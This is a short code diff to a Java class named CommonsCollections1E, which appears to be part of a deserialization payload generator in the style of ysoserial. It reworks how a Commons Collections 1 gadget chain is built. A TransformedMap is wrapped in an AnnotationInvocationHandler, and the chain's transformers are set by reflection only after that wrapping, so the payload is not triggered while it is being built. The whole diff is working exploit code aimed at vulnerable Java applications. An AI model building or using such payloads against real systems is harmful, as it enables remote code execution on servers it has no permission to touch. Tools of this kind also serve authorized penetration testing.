@@ -34,12 +34,12 @@ public class CommonsCollections1E implements ObjectPayload<Object> {
         // sink
         Object sinkObject = SinkScheduler.builder(sinksHelper);
 
-        Object kickOffObject = getChain((Transformer[]) sinkObject);
+        Object kickOffObject = getChain(sinkObject);
 
         return kickOffObject;
     }
 
-    public Object getChain(Transformer[] transformers) throws Exception {
+    public Object getChain(Object transformers) throws Exception {
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
 
@@ -49,10 +49,9 @@ public class CommonsCollections1E implements ObjectPayload<Object> {
         Map<Object, Object> transMap = TransformedMap.decorate(map, null, transformerChain);
 //        Map<Object, Object> transMap = (Map<Object, Object>) Reflections.getFirstCtor("org.apache.commons.collections.map.TransformedMap").newInstance(map, null, transformerChain);
 
+        Object annotationInvocationHandler = KickOff.annotationInvocationHandler(transMap, Target.class);
         // 即 ChainedTransformer 的 Transformer[]
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
-
-        Object annotationInvocationHandler = KickOff.annotationInvocationHandler(transMap, Target.class);
 
         return annotationInvocationHandler;
     }
